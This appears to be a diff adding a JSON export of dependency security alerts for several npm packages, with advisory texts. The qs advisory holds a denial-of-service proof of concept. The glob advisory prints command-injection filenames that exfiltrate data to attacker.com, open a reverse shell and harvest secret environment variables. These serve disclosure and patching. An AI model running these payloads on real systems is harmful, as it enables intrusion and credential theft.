@@ -1,0 +1,391 @@
+[
+  {
+    "alert_number": 186,
+    "state": "open",
+    "created_at": "2026-01-01T07:45:21Z",
+    "updated_at": "2026-01-01T07:45:21Z",
+    "cve_id": "CVE-2025-15284",
+    "ghsa_id": "GHSA-6rw7-vpxm-498p",
+    "severity": "high",
+    "summary": "qs's arrayLimit bypass in its bracket notation allows DoS via memory exhaustion",
+    "description": "### Summary\n\nThe `arrayLimit` option in qs does not enforce limits for bracket notation (`a[]=1&a[]=2`), allowing attackers to cause denial-of-service via memory exhaustion. Applications using `arrayLimit` for DoS protection are vulnerable.\n\n### Details\n\nThe `arrayLimit` option only checks limits for indexed notation (`a[0]=1&a[1]=2`) but completely bypasses it for bracket notation (`a[]=1&a[]=2`).\n\n**Vulnerable code** (`lib/parse.js:159-162`):\n```javascript\nif (root === '[]' && options.parseArrays) {\n    obj = utils.combine([], leaf);  // No arrayLimit check\n}\n```\n\n**Working code** (`lib/parse.js:175`):\n```javascript\nelse if (index <= options.arrayLimit) {  // Limit checked here\n    obj = [];\n    obj[index] = leaf;\n}\n```\n\nThe bracket notation handler at line 159 uses `utils.combine([], leaf)` without validating against `options.arrayLimit`, while indexed notation at line 175 checks `index <= options.arrayLimit` before creating arrays.\n\n### PoC\n\n**Test 1 - Basic bypass:**\n```bash\nnpm install qs\n```\n\n```javascript\nconst qs = require('qs');\nconst result = qs.parse('a[]=1&a[]=2&a[]=3&a[]=4&a[]=5&a[]=6', { arrayLimit: 5 });\nconsole.log(result.a.length);  // Output: 6 (should be max 5)\n```\n\n**Test 2 - DoS demonstration:**\n```javascript\nconst qs = require('qs');\nconst attack = 'a[]=' + Array(10000).fill('x').join('&a[]=');\nconst result = qs.parse(attack, { arrayLimit: 100 });\nconsole.log(result.a.length);  // Output: 10000 (should be max 100)\n```\n\n**Configuration:**\n- `arrayLimit: 5` (test 1) or `arrayLimit: 100` (test 2)\n- Use bracket notation: `a[]=value` (not indexed `a[0]=value`)\n\n### Impact\n\nDenial of Service via memory exhaustion. Affects applications using `qs.parse()` with user-controlled input and `arrayLimit` for protection.\n\n**Attack scenario:**\n1. Attacker sends HTTP request: `GET /api/search?filters[]=x&filters[]=x&...&filters[]=x` (100,000+ times)\n2. Application parses with `qs.parse(query, { arrayLimit: 100 })`\n3. qs ignores limit, parses all 100,000 elements into array\n4. Server memory exhausted → application crashes or becomes unresponsive\n5. Service unavailable for all users\n\n**Real-world impact:**\n- Single malicious request can crash server\n- No authentication required\n- Easy to automate and scale\n- Affects any endpoint parsing query strings with bracket notation\n\n### Suggested Fix\n\nAdd `arrayLimit` validation to the bracket notation handler. The code already calculates `currentArrayLength` at line 147-151, but it's not used in the bracket notation handler at line 159.\n\n**Current code** (`lib/parse.js:159-162`):\n```javascript\nif (root === '[]' && options.parseArrays) {\n    obj = options.allowEmptyArrays && (leaf === '' || (options.strictNullHandling && leaf === null))\n        ? []\n        : utils.combine([], leaf);  // No arrayLimit check\n}\n```\n\n**Fixed code**:\n```javascript\nif (root === '[]' && options.parseArrays) {\n    // Use currentArrayLength already calculated at line 147-151\n    if (options.throwOnLimitExceeded && currentArrayLength >= options.arrayLimit) {\n        throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.');\n    }\n    \n    // If limit exceeded and not throwing, convert to object (consistent with indexed notation behavior)\n    if (currentArrayLength >= options.arrayLimit) {\n        obj = options.plainObjects ? { __proto__: null } : {};\n        obj[currentArrayLength] = leaf;\n    } else {\n        obj = options.allowEmptyArrays && (leaf === '' || (options.strictNullHandling && leaf === null))\n            ? []\n            : utils.combine([], leaf);\n    }\n}\n```\n\nThis makes bracket notation behaviour consistent with indexed notation, enforcing `arrayLimit` and converting to object when limit is exceeded (per README documentation).",
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+    "epss_percentage": 0.00152,
+    "epss_percentile": 0.36343,
+    "cwes": [
+      "CWE-20"
+    ],
+    "cwe_names": [
+      "Improper Input Validation"
+    ],
+    "package_name": "qs",
+    "package_ecosystem": "npm",
+    "vulnerable_version_range": "< 6.14.1",
+    "first_patched_version": "6.14.1",
+    "manifest_path": "src/user-auth-service/yarn.lock",
+    "scope": "runtime",
+    "references": [
+      "https://github.com/ljharb/qs/security/advisories/GHSA-6rw7-vpxm-498p",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-15284",
+      "https://github.com/ljharb/qs/commit/3086902ecf7f088d0d1803887643ac6c03d415b9",
+      "https://github.com/advisories/GHSA-6rw7-vpxm-498p"
+    ]
+  },
+  {
+    "alert_number": 185,
+    "state": "open",
+    "created_at": "2025-12-12T01:12:02Z",
+    "updated_at": "2025-12-12T01:12:02Z",
+    "cve_id": null,
+    "ghsa_id": "GHSA-mwv6-3258-q52c",
+    "severity": "high",
+    "summary": "Next Vulnerable to Denial of Service with Server Components",
+    "description": "A vulnerability affects certain React packages for versions 19.0.0, 19.0.1, 19.1.0, 19.1.1, 19.1.2, 19.2.0, and 19.2.1 and frameworks that use the affected packages, including Next.js 15.x and 16.x using the App Router. The issue is tracked upstream as [CVE-2025-55184](https://www.cve.org/CVERecord?id=CVE-2025-55184).\n\nA malicious HTTP request can be crafted and sent to any App Router endpoint that, when deserialized, can cause the server process to hang and consume CPU. This can result in denial of service in unpatched environments.",
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+    "epss_percentage": null,
+    "epss_percentile": null,
+    "cwes": [
+      "CWE-400",
+      "CWE-502",
+      "CWE-1395"
+    ],
+    "cwe_names": [
+      "Uncontrolled Resource Consumption",
+      "Deserialization of Untrusted Data",
+      "Dependency on Vulnerable Third-Party Component"
+    ],
+    "package_name": "next",
+    "package_ecosystem": "npm",
+    "vulnerable_version_range": ">= 15.0.0-canary.0, < 15.0.6",
+    "first_patched_version": "15.0.6",
+    "manifest_path": "src/frontend-nextjs/package-lock.json",
+    "scope": "runtime",
+    "references": [
+      "https://github.com/vercel/next.js/security/advisories/GHSA-mwv6-3258-q52c",
+      "https://nextjs.org/blog/security-update-2025-12-11",
+      "https://www.cve.org/CVERecord?id=CVE-2025-55184",
+      "https://github.com/advisories/GHSA-mwv6-3258-q52c"
+    ]
+  },
+  {
+    "alert_number": 177,
+    "state": "open",
+    "created_at": "2025-12-04T21:15:09Z",
+    "updated_at": "2025-12-04T21:15:09Z",
+    "cve_id": "CVE-2025-65945",
+    "ghsa_id": "GHSA-869p-cjfg-cm3x",
+    "severity": "high",
+    "summary": "auth0/node-jws Improperly Verifies HMAC Signature",
+    "description": "### Overview\nAn improper signature verification vulnerability exists when using auth0/node-jws with the HS256 algorithm under specific conditions.\n\n### Am I Affected?\nYou are affected by this vulnerability if you meet all of the following preconditions:\n\n1. Application uses the auth0/node-jws implementation of JSON Web Signatures, versions <=3.2.2 || 4.0.0\n2. Application uses the jws.createVerify() function for HMAC algorithms\n3. Application uses user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines\n\nYou are NOT affected by this vulnerability if you meet any of the following preconditions:\n1. Application uses the jws.verify() interface (note: `auth0/node-jsonwebtoken` users fall into this category and are therefore NOT affected by this vulnerability)\n2. Application uses only asymmetric algorithms (e.g. RS256)\n3. Application doesn’t use user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines\n\n### Fix\nUpgrade auth0/node-jws version to version 3.2.3 or 4.0.1\n\n### Acknowledgement\nOkta would like to thank Félix Charette for discovering this vulnerability.",
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+    "epss_percentage": 0.00009,
+    "epss_percentile": 0.00684,
+    "cwes": [
+      "CWE-347"
+    ],
+    "cwe_names": [
+      "Improper Verification of Cryptographic Signature"
+    ],
+    "package_name": "jws",
+    "package_ecosystem": "npm",
+    "vulnerable_version_range": "< 3.2.3",
+    "first_patched_version": "3.2.3",
+    "manifest_path": "src/user-auth-service/yarn.lock",
+    "scope": "runtime",
+    "references": [
+      "https://github.com/auth0/node-jws/security/advisories/GHSA-869p-cjfg-cm3x",
+      "https://github.com/auth0/node-jws/commit/34c45b2c04434f925b638de6a061de9339c0ea2e",
+      "https://github.com/auth0/node-jws/commit/4f6e73f24df42f07d632dec6431ade8eda8d11a6",
+      "https://github.com/auth0/node-jws/releases/tag/v3.2.3",
+      "https://github.com/auth0/node-jws/releases/tag/v4.0.1",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-65945",
+      "https://github.com/advisories/GHSA-869p-cjfg-cm3x"
+    ]
+  },
+  {
+    "alert_number": 174,
+    "state": "open",
+    "created_at": "2025-12-02T21:13:17Z",
+    "updated_at": "2025-12-02T21:13:17Z",
+    "cve_id": "CVE-2025-12758",
+    "ghsa_id": "GHSA-vghf-hv5q-vc2g",
+    "severity": "high",
+    "summary": "Validator is Vulnerable to Incomplete Filtering of One or More Instances of Special Elements",
+    "description": "Versions of the package validator before 13.15.22 are vulnerable to Incomplete Filtering of One or More Instances of Special Elements in the isLength() function that does not take into account Unicode variation selectors (\\uFE0F, \\uFE0E) appearing in a sequence which lead to improper string length calculation. This can lead to an application using isLength for input validation accepting strings significantly longer than intended, resulting in issues like data truncation in databases, buffer overflows in other system components, or denial-of-service.",
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+    "epss_percentage": 0.00065,
+    "epss_percentile": 0.20433,
+    "cwes": [
+      "CWE-792"
+    ],
+    "cwe_names": [
+      "Incomplete Filtering of One or More Instances of Special Elements"
+    ],
+    "package_name": "validator",
+    "package_ecosystem": "npm",
+    "vulnerable_version_range": "< 13.15.22",
+    "first_patched_version": "13.15.22",
+    "manifest_path": "src/frontend-nextjs/package-lock.json",
+    "scope": "runtime",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-12758",
+      "https://github.com/validatorjs/validator.js/pull/2616",
+      "https://gist.github.com/koral--/ad31208b25b9e3d1e2e35f1d4d72572e",
+      "https://security.snyk.io/vuln/SNYK-JS-VALIDATOR-13653476",
+      "https://github.com/validatorjs/validator.js/commit/d457ecaf55b0f3d8bd379d82757425d0d13dd382",
+      "https://github.com/advisories/GHSA-vghf-hv5q-vc2g"
+    ]
+  },
+  {
+    "alert_number": 170,
+    "state": "open",
+    "created_at": "2025-11-20T02:37:59Z",
+    "updated_at": "2025-11-20T02:37:59Z",
+    "cve_id": "CVE-2025-64756",
+    "ghsa_id": "GHSA-5j98-mcp5-4vw2",
+    "severity": "high",
+    "summary": "glob CLI: Command injection via -c/--cmd executes matches with shell:true",
+    "description": "### Summary\n\nThe glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c <command> <patterns>` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:\n\n```javascript\nstream.on('end', () => foregroundChild(cmd, matches, { shell: true }))\n```\n\n**Technical Flow:**\n1. User runs `glob -c <command> <pattern>` \n2. CLI finds files matching the pattern\n3. Matched filenames are collected into an array\n4. Command is executed with matched filenames as arguments using `shell: true`\n5. Shell interprets metacharacters in filenames as command syntax\n6. Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory && cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode /path/to/glob/dist/esm/bin.mjs -c echo \"**/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)\ntouch '$(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)\ntouch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable\n\n### Remediation\n\n- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.",
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
+    "epss_percentage": 0.00044,
+    "epss_percentile": 0.13743,
+    "cwes": [
+      "CWE-78"
+    ],
+    "cwe_names": [
+      "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+    ],
+    "package_name": "glob",
+    "package_ecosystem": "npm",
+    "vulnerable_version_range": ">= 10.2.0, < 10.5.0",
+    "first_patched_version": "10.5.0",
+    "manifest_path": "src/frontend-nextjs/package-lock.json",
+    "scope": "runtime",
+    "references": [
+      "https://github.com/isaacs/node-glob/security/advisories/GHSA-5j98-mcp5-4vw2",
+      "https://github.com/isaacs/node-glob/commit/47473c046b91c67269df7a66eab782a6c2716146",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-64756",
+      "https://github.com/isaacs/node-glob/commit/1e4e297342a09f2aa0ced87fcd4a70ddc325d75f",
+      "https://github.com/advisories/GHSA-5j98-mcp5-4vw2"
+    ]
+  },
+  {
+    "alert_number": 158,
+    "state": "open",
+    "created_at": "2025-10-27T17:08:12Z",
+    "updated_at": "2025-10-27T17:08:12Z",
+    "cve_id": "CVE-2025-56200",
+    "ghsa_id": "GHSA-9965-vmph-33xx",
+    "severity": "medium",
+    "summary": "validator.js has a URL validation bypass vulnerability in its isURL function",
+    "description": "A URL validation bypass vulnerability exists in validator.js prior to version 13.15.20. The isURL() function uses '://' as a delimiter to parse protocols, while browsers use ':' as the delimiter. This parsing difference allows attackers to bypass protocol and domain validation by crafting URLs leading to XSS and Open Redirect attacks.",
+    "cvss_score": 6.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+    "epss_percentage": 0.00053,
+    "epss_percentile": 0.1661,
+    "cwes": [
+      "CWE-79"
+    ],
+    "cwe_names": [
+      "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+    ],
+    "package_name": "validator",
+    "package_ecosystem": "npm",
+    "vulnerable_version_range": "< 13.15.20",
+    "first_patched_version": "13.15.20",
+    "manifest_path": "src/frontend-nextjs/package-lock.json",
+    "scope": "runtime",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-56200",
+      "https://gist.github.com/junan-98/27ae092aa40e2a057d41a0f95148f666",
+      "https://gist.github.com/junan-98/a93130505b258b9e4ec9f393e7533596",
+      "https://github.com/validatorjs/validator.js",
+      "http://validatorjs.com",
+      "https://github.com/validatorjs/validator.js/issues/2600",
+      "https://github.com/validatorjs/validator.js/pull/2608",
+      "https://github.com/validatorjs/validator.js/commit/cbef5088f02d36caf978f378bb845fe49bdc0809",
+      "https://github.com/validatorjs/validator.js/releases/tag/13.15.20",
+      "https://github.com/advisories/GHSA-9965-vmph-33xx"
+    ]
+  },
+  {
+    "alert_number": 183,
+    "state": "open",
+    "created_at": "2025-12-12T01:09:04Z",
+    "updated_at": "2025-12-12T01:09:04Z",
+    "cve_id": null,
+    "ghsa_id": "GHSA-w37m-7fhw-fmv9",
+    "severity": "medium",
+    "summary": "Next Server Actions Source Code Exposure ",
+    "description": "A vulnerability affects certain React packages for versions 19.0.0, 19.0.1, 19.1.0, 19.1.1, 19.1.2, 19.2.0, and 19.2.1 and frameworks that use the affected packages, including Next.js 15.x and 16.x using the App Router. The issue is tracked upstream as [CVE-2025-55183](https://www.cve.org/CVERecord?id=CVE-2025-55183).\n\nA malicious HTTP request can be crafted and sent to any App Router endpoint that can return the compiled source code of [Server Functions](https://react.dev/reference/rsc/server-functions). This could reveal business logic, but would not expose secrets unless they were hardcoded directly into [Server Function](https://react.dev/reference/rsc/server-functions) code.",
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "epss_percentage": null,
+    "epss_percentile": null,
+    "cwes": [
+      "CWE-497",
+      "CWE-502",
+      "CWE-1395"
+    ],
+    "cwe_names": [
+      "Exposure of Sensitive System Information to an Unauthorized Control Sphere",
+      "Deserialization of Untrusted Data",
+      "Dependency on Vulnerable Third-Party Component"
+    ],
+    "package_name": "next",
+    "package_ecosystem": "npm",
+    "vulnerable_version_range": ">= 15.0.0-canary.0, < 15.0.6",
+    "first_patched_version": "15.0.6",
+    "manifest_path": "src/frontend-nextjs/package-lock.json",
+    "scope": "runtime",
+    "references": [
+      "https://github.com/vercel/next.js/security/advisories/GHSA-w37m-7fhw-fmv9",
+      "https://nextjs.org/blog/security-update-2025-12-11",
+      "https://www.cve.org/CVERecord?id=CVE-2025-55183",
+      "https://github.com/advisories/GHSA-w37m-7fhw-fmv9"
+    ]
+  },
+  {
+    "alert_number": 167,
+    "state": "open",
+    "created_at": "2025-11-18T21:05:17Z",
+    "updated_at": "2025-11-18T21:05:17Z",
+    "cve_id": "CVE-2025-64718",
+    "ghsa_id": "GHSA-mh29-5h37-fv8m",
+    "severity": "medium",
+    "summary": "js-yaml has prototype pollution in merge (<<)",
+    "description": "### Impact\n\nIn js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`). All users who parse untrusted yaml documents may be impacted.\n\n### Patches\n\nProblem is patched in js-yaml 4.1.1 and 3.14.2.\n\n### Workarounds\n\nYou can protect against this kind of attack on the server by using `node --disable-proto=delete` or `deno` (in Deno, pollution protection is on by default).\n\n### References\n\nhttps://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html",
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+    "epss_percentage": 0.00019,
+    "epss_percentile": 0.04063,
+    "cwes": [
+      "CWE-1321"
+    ],
+    "cwe_names": [
+      "Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')"
+    ],
+    "package_name": "js-yaml",
+    "package_ecosystem": "npm",
+    "vulnerable_version_range": ">= 4.0.0, < 4.1.1",
+    "first_patched_version": "4.1.1",
+    "manifest_path": "src/frontend-nextjs/package-lock.json",
+    "scope": "runtime",
+    "references": [
+      "https://github.com/nodeca/js-yaml/security/advisories/GHSA-mh29-5h37-fv8m",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-64718",
+      "https://github.com/nodeca/js-yaml/commit/383665ff4248ec2192d1274e934462bb30426879",
+      "https://github.com/nodeca/js-yaml/commit/5278870a17454fe8621dbd8c445c412529525266",
+      "https://github.com/advisories/GHSA-mh29-5h37-fv8m"
+    ]
+  },
+  {
+    "alert_number": 166,
+    "state": "open",
+    "created_at": "2025-11-18T21:05:17Z",
+    "updated_at": "2025-11-18T21:05:17Z",
+    "cve_id": "CVE-2025-64718",
+    "ghsa_id": "GHSA-mh29-5h37-fv8m",
+    "severity": "medium",
+    "summary": "js-yaml has prototype pollution in merge (<<)",
+    "description": "### Impact\n\nIn js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`). All users who parse untrusted yaml documents may be impacted.\n\n### Patches\n\nProblem is patched in js-yaml 4.1.1 and 3.14.2.\n\n### Workarounds\n\nYou can protect against this kind of attack on the server by using `node --disable-proto=delete` or `deno` (in Deno, pollution protection is on by default).\n\n### References\n\nhttps://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html",
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+    "epss_percentage": 0.00019,
+    "epss_percentile": 0.04063,
+    "cwes": [
+      "CWE-1321"
+    ],
+    "cwe_names": [
+      "Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')"
+    ],
+    "package_name": "js-yaml",
+    "package_ecosystem": "npm",
+    "vulnerable_version_range": ">= 4.0.0, < 4.1.1",
+    "first_patched_version": "4.1.1",
+    "manifest_path": "package-lock.json",
+    "scope": "development",
+    "references": [
+      "https://github.com/nodeca/js-yaml/security/advisories/GHSA-mh29-5h37-fv8m",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-64718",
+      "https://github.com/nodeca/js-yaml/commit/383665ff4248ec2192d1274e934462bb30426879",
+      "https://github.com/nodeca/js-yaml/commit/5278870a17454fe8621dbd8c445c412529525266",
+      "https://github.com/advisories/GHSA-mh29-5h37-fv8m"
+    ]
+  },
+  {
+    "alert_number": 165,
+    "state": "open",
+    "created_at": "2025-11-18T21:05:16Z",
+    "updated_at": "2025-11-18T21:05:16Z",
+    "cve_id": "CVE-2025-64718",
+    "ghsa_id": "GHSA-mh29-5h37-fv8m",
+    "severity": "medium",
+    "summary": "js-yaml has prototype pollution in merge (<<)",
+    "description": "### Impact\n\nIn js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`). All users who parse untrusted yaml documents may be impacted.\n\n### Patches\n\nProblem is patched in js-yaml 4.1.1 and 3.14.2.\n\n### Workarounds\n\nYou can protect against this kind of attack on the server by using `node --disable-proto=delete` or `deno` (in Deno, pollution protection is on by default).\n\n### References\n\nhttps://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html",
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+    "epss_percentage": 0.00019,
+    "epss_percentile": 0.04063,
+    "cwes": [
+      "CWE-1321"
+    ],
+    "cwe_names": [
+      "Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')"
+    ],
+    "package_name": "js-yaml",
+    "package_ecosystem": "npm",
+    "vulnerable_version_range": ">= 4.0.0, < 4.1.1",
+    "first_patched_version": "4.1.1",
+    "manifest_path": "src/user-simulator/package-lock.json",
+    "scope": "runtime",
+    "references": [
+      "https://github.com/nodeca/js-yaml/security/advisories/GHSA-mh29-5h37-fv8m",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-64718",
+      "https://github.com/nodeca/js-yaml/commit/383665ff4248ec2192d1274e934462bb30426879",
+      "https://github.com/nodeca/js-yaml/commit/5278870a17454fe8621dbd8c445c412529525266",
+      "https://github.com/advisories/GHSA-mh29-5h37-fv8m"
+    ]
+  },
+  {
+    "alert_number": 173,
+    "state": "open",
+    "created_at": "2025-12-02T03:07:17Z",
+    "updated_at": "2025-12-02T03:07:17Z",
+    "cve_id": "CVE-2025-66400",
+    "ghsa_id": "GHSA-4fh9-h7wg-q85m",
+    "severity": "medium",
+    "summary": "mdast-util-to-hast has unsanitized class attribute",
+    "description": "### Impact\n\nMultiple (unprefixed) classnames could be added in markdown source by using character references.\nThis could make rendered user supplied markdown `code` elements appear like the rest of the page.\nThe following markdown:\n\n````markdown\n```js&#x20;xss\n```\n````\n\nWould create `<pre><code class=\"language-js xss\"></code></pre>`\nIf your page then applied `.xss` classes (or listeners in JS), those apply to this element.\nFor more info see <https://github.com/ChALkeR/notes/blob/master/Improper-markup-sanitization.md#unsanitized-class-attribute>\n\n### Patches\n\nThe bug was patched. When using regular semver, run `npm install`. For exact ranges, make sure to use `13.2.1`.\n\n### Workarounds\n\nUpdate.\n\n### References\n\n* bug introduced in https://github.com/syntax-tree/mdast-util-to-hast/commit/6fc783ae6abdeb798fd5a68e7f3f21411dde7403\n* bug fixed in https://github.com/syntax-tree/mdast-util-to-hast/commit/ab3a79570a1afbfa7efef5d4a0cd9b5caafbc5d7",
+    "cvss_score": 0,
+    "cvss_vector": null,
+    "epss_percentage": 0.00073,
+    "epss_percentile": 0.22622,
+    "cwes": [
+      "CWE-20",
+      "CWE-915"
+    ],
+    "cwe_names": [
+      "Improper Input Validation",
+      "Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+    ],
+    "package_name": "mdast-util-to-hast",
+    "package_ecosystem": "npm",
+    "vulnerable_version_range": ">= 13.0.0, < 13.2.1",
+    "first_patched_version": "13.2.1",
+    "manifest_path": "src/frontend-nextjs/package-lock.json",
+    "scope": "runtime",
+    "references": [
+      "https://github.com/syntax-tree/mdast-util-to-hast/security/advisories/GHSA-4fh9-h7wg-q85m",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-66400",
+      "https://github.com/syntax-tree/mdast-util-to-hast/commit/6fc783ae6abdeb798fd5a68e7f3f21411dde7403",
+      "https://github.com/syntax-tree/mdast-util-to-hast/commit/ab3a79570a1afbfa7efef5d4a0cd9b5caafbc5d7",
+      "https://github.com/advisories/GHSA-4fh9-h7wg-q85m"
+    ]
+  }
+]
